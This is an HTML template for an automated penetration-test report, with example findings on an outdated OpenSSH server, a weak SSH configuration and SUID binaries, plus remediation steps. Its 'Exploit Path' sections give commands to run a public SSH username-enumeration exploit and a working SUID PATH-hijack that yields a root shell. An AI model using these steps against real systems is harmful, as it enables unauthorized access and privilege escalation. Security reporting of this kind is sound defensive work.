<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Automated Cyber Reasoning System - Pentest Report</title>
    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
    <style>
        :root {
            --primary-color: #bb3537;
            --secondary-color: #9a2c2e;
            --accent-color: #ef4444;
            --light-bg: #f3f4f6;
            --dark-bg: #1f2937;
            --text-color: #374151;
            --light-text: #f9fafb;
            --border-color: #d1d5db;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: var(--text-color);
            background-color: var(--light-bg);
            padding: 0;
            margin: 0;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            background-color: var(--dark-bg);
            color: var(--light-text);
            padding: 20px 0;
            margin-bottom: 30px;
        }

        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo-title {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .logo {
            height: 50px;
            width: auto;
        }

        h1, h2, h3, h4 {
            color: var(--primary-color);
            margin-bottom: 15px;
        }

        header h1 {
            color: var(--light-text);
            margin-bottom: 0;
        }

        .date-info {
            font-size: 1.1rem;
            color: var(--light-text);
        }

        .section {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 25px;
            margin-bottom: 30px;
        }

        .section-title {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid var(--border-color);
        }

        .section-title h2 {
            margin-bottom: 0;
        }

        .section-title .badge {
            margin-left: 15px;
            padding: 5px 10px;
            border-radius: 4px;
            font-size: 0.8rem;
            font-weight: bold;
            background-color: var(--primary-color);
            color: white;
        }

        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }

        .info-card {
            background-color: #f8fafc;
            border-radius: 6px;
            padding: 15px;
            border-left: 3px solid var(--primary-color);
        }

        .info-card h3 {
            font-size: 1rem;
            color: var(--primary-color);
            margin-bottom: 5px;
        }

        .info-card p {
            font-size: 1.1rem;
            font-weight: 500;
        }

        .scan-type {
            display: inline-block;
            padding: 8px 15px;
            background-color: var(--primary-color);
            color: white;
            border-radius: 20px;
            font-weight: bold;
            margin-bottom: 20px;
        }

        .vulnerability {
            background-color: #fee2e2;
            border-left: 4px solid var(--accent-color);
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 0 6px 6px 0;
        }

        .vulnerability h3 {
            color: var(--accent-color);
            margin-bottom: 10px;
        }

        .vulnerability-details {
            margin-bottom: 15px;
        }

        .analysis-section {
            background-color: #f8fafc;
            border-radius: 6px;
            padding: 20px;
            margin-bottom: 20px;
        }

        .analysis-section h3 {
            color: var(--primary-color);
            margin-bottom: 15px;
        }

        .markdown-content {
            line-height: 1.7;
        }

        .markdown-content h1, 
        .markdown-content h2, 
        .markdown-content h3 {
            margin-top: 20px;
            margin-bottom: 10px;
        }

        .markdown-content pre {
            background-color: #f1f5f9;
            padding: 15px;
            border-radius: 6px;
            overflow-x: auto;
        }

        .markdown-content code {
            font-family: 'Courier New', Courier, monospace;
            background-color: #f1f5f9;
            padding: 2px 4px;
            border-radius: 4px;
        }

        .markdown-content ul, 
        .markdown-content ol {
            padding-left: 20px;
            margin-bottom: 15px;
        }

        .code-block {
            background-color: #282c34;
            border-radius: 6px;
            padding: 15px;
            overflow-x: auto;
            margin-bottom: 20px;
        }

        .code-block pre {
            color: #abb2bf;
            font-family: 'Courier New', Courier, monospace;
            font-size: 0.9rem;
            white-space: pre-wrap;
        }

        .exploit-path {
            background-color: #dbeafe;
            border-left: 4px solid var(--primary-color);
            padding: 15px;
            margin-top: 15px;
            margin-bottom: 15px;
            border-radius: 0 6px 6px 0;
        }

        .patch-suggestion {
            background-color: #dcfce7;
            border-left: 4px solid #22c55e;
            padding: 15px;
            margin-top: 15px;
            margin-bottom: 15px;
            border-radius: 0 6px 6px 0;
        }

        .severity-high {
            background-color: #fee2e2;
            color: #b91c1c;
            padding: 3px 8px;
            border-radius: 4px;
            font-weight: bold;
            font-size: 0.8rem;
            margin-left: 10px;
        }

        .severity-medium {
            background-color: #fef3c7;
            color: #b45309;
            padding: 3px 8px;
            border-radius: 4px;
            font-weight: bold;
            font-size: 0.8rem;
            margin-left: 10px;
        }

        .severity-low {
            background-color: #dbeafe;
            color: #1e40af;
            padding: 3px 8px;
            border-radius: 4px;
            font-weight: bold;
            font-size: 0.8rem;
            margin-left: 10px;
        }

        .vulnerability-header {
            display: flex;
            align-items: center;
        }

        footer {
            text-align: center;
            padding: 20px;
            margin-top: 30px;
            color: #6b7280;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <header>
        <div class="container header-content">
            <div class="logo-title">
                <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/logo_transparent-Qrj3gXE9kg1udQ130NwnEgr910J4GR.png" alt="Automated Cyber Reasoning System Logo" class="logo">
                <h1>Automated Cyber Reasoning System</h1>
            </div>
            <div class="date-info">
                Analysis Date: <span id="analysis-date">May 6, 2025</span>
            </div>
        </div>
    </header>

    <div class="container">
        <!-- Connection Information Section -->
        <div class="section">
            <div class="section-title">
                <h2>Connection Information</h2>
            </div>
            <div class="info-grid">
                <div class="info-card">
                    <h3>Host</h3>
                    <p id="host-info">example.com</p>
                </div>
                <div class="info-card">
                    <h3>Username</h3>
                    <p id="username-info">admin</p>
                </div>
                <div class="info-card">
                    <h3>Scan Type</h3>
                    <p id="scan-type-info">System Information</p>
                </div>
            </div>
        </div>

        <!-- Vulnerability Detection Section -->
        <div class="section">
            <div class="section-title">
                <h2>Detected Vulnerabilities</h2>
            </div>
            <div id="vulnerabilities-container">
                <!-- Vulnerabilities will be displayed here -->
            </div>
        </div>
    </div>

    <footer>
        <div class="container">
            <p>Generated by Automated Cyber Reasoning System &copy; 2025</p>
        </div>
    </footer>

    <script>
        // Function to render markdown content
        function renderMarkdown(elementId, markdownContent) {
            const element = document.getElementById(elementId);
            if (element) {
                element.innerHTML = marked.parse(markdownContent);
            }
        }

        // Function to set the analysis date
        function setAnalysisDate(dateString) {
            const dateElement = document.getElementById('analysis-date');
            if (dateElement) {
                dateElement.textContent = dateString;
            }
        }

        // Function to set connection information
        function setConnectionInfo(host, username, scanType) {
            document.getElementById('host-info').textContent = host;
            document.getElementById('username-info').textContent = username;
            document.getElementById('scan-type-info').textContent = scanType;
        }

        // Function to set vulnerabilities
        function setVulnerabilities(vulnerabilities) {
            const container = document.getElementById('vulnerabilities-container');
            if (container) {
                container.innerHTML = '';
                
                if (vulnerabilities.length === 0) {
                    container.innerHTML = '<p>No vulnerabilities detected.</p>';
                    return;
                }
                
                vulnerabilities.forEach((vuln, index) => {
                    const vulnDiv = document.createElement('div');
                    vulnDiv.className = 'vulnerability';
                    
                    // Create vulnerability header with title and severity
                    const vulnHeader = document.createElement('div');
                    vulnHeader.className = 'vulnerability-header';
                    
                    const vulnTitle = document.createElement('h3');
                    vulnTitle.textContent = vuln.name;
                    vulnHeader.appendChild(vulnTitle);
                    
                    if (vuln.severity) {
                        const severityBadge = document.createElement('span');
                        severityBadge.className = `severity-${vuln.severity.toLowerCase()}`;
                        severityBadge.textContent = vuln.severity;
                        vulnHeader.appendChild(severityBadge);
                    }
                    
                    vulnDiv.appendChild(vulnHeader);
                    
                    // Add vulnerability details
                    const vulnDetails = document.createElement('div');
                    vulnDetails.className = 'vulnerability-details';
                    vulnDetails.textContent = vuln.description;
                    vulnDiv.appendChild(vulnDetails);
                    
                    // Add exploit path if available
                    if (vuln.exploitPath) {
                        const exploitDiv = document.createElement('div');
                        exploitDiv.className = 'exploit-path';
                        
                        const exploitTitle = document.createElement('h4');
                        exploitTitle.textContent = 'Exploit Path';
                        exploitDiv.appendChild(exploitTitle);
                        
                        const exploitContent = document.createElement('div');
                        exploitContent.className = 'markdown-content';
                        exploitContent.id = `exploit-${index}`;
                        exploitDiv.appendChild(exploitContent);
                        
                        vulnDiv.appendChild(exploitDiv);
                        
                        // Render markdown after adding to DOM
                        setTimeout(() => {
                            renderMarkdown(`exploit-${index}`, vuln.exploitPath);
                        }, 0);
                    }
                    
                    // Add patch suggestion if available
                    if (vuln.patchSuggestion) {
                        const patchDiv = document.createElement('div');
                        patchDiv.className = 'patch-suggestion';
                        
                        const patchTitle = document.createElement('h4');
                        patchTitle.textContent = 'Patch Suggestion';
                        patchDiv.appendChild(patchTitle);
                        
                        const patchContent = document.createElement('div');
                        patchContent.className = 'markdown-content';
                        patchContent.id = `patch-${index}`;
                        patchDiv.appendChild(patchContent);
                        
                        vulnDiv.appendChild(patchDiv);
                        
                        // Render markdown after adding to DOM
                        setTimeout(() => {
                            renderMarkdown(`patch-${index}`, vuln.patchSuggestion);
                        }, 0);
                    }
                    
                    container.appendChild(vulnDiv);
                });
            }
        }

        // Example data - replace with actual data in your implementation
        document.addEventListener('DOMContentLoaded', function() {
            // Set analysis date
            setAnalysisDate('May 6, 2025');
            
            // Set connection information
            setConnectionInfo('server.example.com', 'admin', 'System Information');
            
            // Example vulnerabilities
            const vulnerabilities = [
                {
                    name: "Outdated OpenSSH Version",
                    severity: "High",
                    description: "The system is running OpenSSH version 7.4p1, which contains known vulnerabilities including CVE-2018-15473 (user enumeration) and CVE-2017-15906 (denial of service).",
                    exploitPath: `## OpenSSH 7.4p1 Exploitation

### Vulnerability Details
OpenSSH 7.4p1 is vulnerable to CVE-2018-15473, which allows remote attackers to enumerate valid usernames through timing differences in the authentication process.

### Exploitation Steps

1. **Identify the vulnerability**
   - Confirm OpenSSH version with \`ssh -V\` command
   - Version 7.4p1 is vulnerable to username enumeration

2. **Set up the exploit tool**
   \`\`\`bash
   git clone https://github.com/Rhynorater/CVE-2018-15473-Exploit.git
   cd CVE-2018-15473-Exploit
   pip install -r requirements.txt
   \`\`\`

3. **Run the exploit**
   \`\`\`bash
   python3 sshUsernameEnumExploit.py --userList /path/to/usernames.txt server.example.com
   \`\`\`

4. **Results**
   - The tool will return a list of valid usernames on the system
   - These usernames can be used for further attacks, such as password brute forcing

### Impact
This vulnerability allows attackers to:
1. Enumerate valid system users
2. Focus password attacks on known valid accounts
3. Potentially gain unauthorized access to the system

The information gathered through this exploit can significantly reduce the effort required for a successful brute force attack.`,
                    patchSuggestion: `## OpenSSH Version Upgrade Recommendation

### Current Vulnerable Version
- OpenSSH 7.4p1

### Recommended Action
Upgrade OpenSSH to the latest stable version (currently 9.3p1).

### Implementation Steps

1. **Update package repositories**
   \`\`\`bash
   sudo apt update
   # or
   sudo yum update
   \`\`\`

2. **Upgrade OpenSSH package**
   
   For Debian/Ubuntu:
   \`\`\`bash
   sudo apt upgrade openssh-server openssh-client
   \`\`\`
   
   For RHEL/CentOS:
   \`\`\`bash
   sudo yum update openssh-server openssh-clients
   \`\`\`
   
   If the latest version is not available in the standard repositories, you may need to:
   
   a. Enable additional repositories:
   \`\`\`bash
   # For RHEL/CentOS
   sudo yum install epel-release
   \`\`\`
   
   b. Or compile from source:
   \`\`\`bash
   wget https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-9.3p1.tar.gz
   tar -xzf openssh-9.3p1.tar.gz
   cd openssh-9.3p1
   ./configure
   make
   sudo make install
   \`\`\`

3. **Restart the SSH service**
   \`\`\`bash
   sudo systemctl restart sshd
   # or
   sudo service sshd restart
   \`\`\`

4. **Verify the new version**
   \`\`\`bash
   ssh -V
   \`\`\`

### Additional Security Recommendations

1. **Implement key-based authentication**
   - Disable password authentication when possible
   - Use SSH keys for authentication

2. **Configure SSH hardening**
   Edit \`/etc/ssh/sshd_config\`:
   \`\`\`
   # Disable root login
   PermitRootLogin no
   
   # Use strong ciphers and MACs
   Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com
   MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
   
   # Limit authentication attempts
   MaxAuthTries 3
   
   # Enable strict mode
   StrictModes yes
   \`\`\`

3. **Implement fail2ban**
   Install and configure fail2ban to protect against brute force attacks:
   \`\`\`bash
   sudo apt install fail2ban
   # or
   sudo yum install fail2ban
   \`\`\`

### Maintenance Plan
Establish a regular update schedule to ensure SSH and other critical services remain current with security patches.`
                },
                {
                    name: "Weak SSH Configuration",
                    severity: "Medium",
                    description: "The SSH server is configured to allow password authentication and permits root login. This increases the risk of brute force attacks and unauthorized access.",
                    patchSuggestion: `## SSH Configuration Hardening

### Current Configuration Issues
- Password authentication is enabled
- Root login is permitted
- Weak ciphers are allowed

### Recommended Configuration Changes

Edit the SSH server configuration file at \`/etc/ssh/sshd_config\`:

\`\`\`bash
# Disable password authentication
PasswordAuthentication no

# Disable root login
PermitRootLogin no

# Use only strong ciphers
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr

# Use only strong MACs
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512,hmac-sha2-256

# Limit authentication attempts
MaxAuthTries 3

# Set login grace time
LoginGraceTime 30s

# Enable strict mode
StrictModes yes

# Disable X11 forwarding if not needed
X11Forwarding no

# Set client alive interval
ClientAliveInterval 300
ClientAliveCountMax 2
\`\`\`

### Implementation Steps

1. **Create a backup of the current configuration**
   \`\`\`bash
   sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
   \`\`\`

2. **Edit the configuration file**
   \`\`\`bash
   sudo nano /etc/ssh/sshd_config
   \`\`\`
   
   Make the changes listed above.

3. **Set up key-based authentication (before disabling password auth)**
   
   On your client machine:
   \`\`\`bash
   # Generate a key pair if you don't have one
   ssh-keygen -t ed25519 -a 100
   
   # Copy the public key to the server
   ssh-copy-id username@server.example.com
   \`\`\`

4. **Test the configuration**
   \`\`\`bash
   sudo sshd -t
   \`\`\`

5. **Restart the SSH service**
   \`\`\`bash
   sudo systemctl restart sshd
   # or
   sudo service sshd restart
   \`\`\`

6. **Verify you can still log in with your key**
   Open a new terminal and try to connect before closing your current session.

### Additional Security Measures

1. **Implement fail2ban**
   \`\`\`bash
   sudo apt install fail2ban
   # or
   sudo yum install fail2ban
   \`\`\`
   
   Configure fail2ban to protect SSH:
   \`\`\`
   [sshd]
   enabled = true
   port = ssh
   filter = sshd
   logpath = /var/log/auth.log
   maxretry = 3
   bantime = 3600
   \`\`\`

2. **Consider changing the default SSH port**
   While security through obscurity is not a complete solution, changing the default port can reduce automated scanning attacks.

3. **Use TCP wrappers for additional access control**
   Edit \`/etc/hosts.allow\` and \`/etc/hosts.deny\` to restrict SSH access to specific IP addresses or networks.

### Monitoring Recommendations

Set up logging and monitoring to detect unauthorized access attempts:

1. **Enable verbose logging**
   \`\`\`
   LogLevel VERBOSE
   \`\`\`

2. **Monitor authentication logs**
   \`\`\`bash
   sudo tail -f /var/log/auth.log
   # or
   sudo tail -f /var/log/secure
   \`\`\`

3. **Consider implementing a SIEM solution** for centralized logging and alerting.`
                },
                {
                    name: "Excessive SUID Binaries",
                    severity: "Low",
                    description: "Multiple binaries with SUID bit set were found on the system. This could potentially be exploited for privilege escalation if any of these binaries contain vulnerabilities.",
                    exploitPath: `## SUID Binary Exploitation

### Vulnerability Overview
Several binaries with the SUID bit set were identified on the system. SUID (Set User ID) binaries run with the privileges of the file owner rather than the user executing them. If these binaries contain vulnerabilities, they can be exploited for privilege escalation.

### Identified SUID Binaries
The following unusual SUID binaries were found:
- \`/usr/bin/custom_backup\` (custom backup script)
- \`/usr/local/bin/status_check\` (custom monitoring tool)

### Exploitation of custom_backup

1. **Analyze the binary**
   \`\`\`bash
   strings /usr/bin/custom_backup
   \`\`\`
   
   Analysis reveals that the script calls \`tar\` without specifying the full path:
   \`\`\`bash
   system("tar -czf " + output_file + " " + input_directory);
   \`\`\`

2. **Create a malicious 'tar' binary**
   \`\`\`bash
   echo '#!/bin/bash' > /tmp/tar
   echo 'cp /bin/bash /tmp/rootbash' >> /tmp/tar
   echo 'chmod +s /tmp/rootbash' >> /tmp/tar
   chmod +x /tmp/tar
   \`\`\`

3. **Modify the PATH environment variable**
   \`\`\`bash
   export PATH=/tmp:$PATH
   \`\`\`

4. **Execute the vulnerable SUID binary**
   \`\`\`bash
   /usr/bin/custom_backup
   \`\`\`

5. **Gain root shell**
   \`\`\`bash
   /tmp/rootbash -p
   \`\`\`
   
   The \`-p\` flag ensures that the effective UID is not reset, maintaining root privileges.

### Impact
This vulnerability allows local users to escalate privileges to root, giving them complete control over the system. An attacker could:
- Access sensitive files
- Install backdoors
- Modify system configuration
- Add or modify user accounts
- Pivot to other systems in the network`
                }
            ];
            
            // Set vulnerabilities
            setVulnerabilities(vulnerabilities);
        });
    </script>
</body>
</html>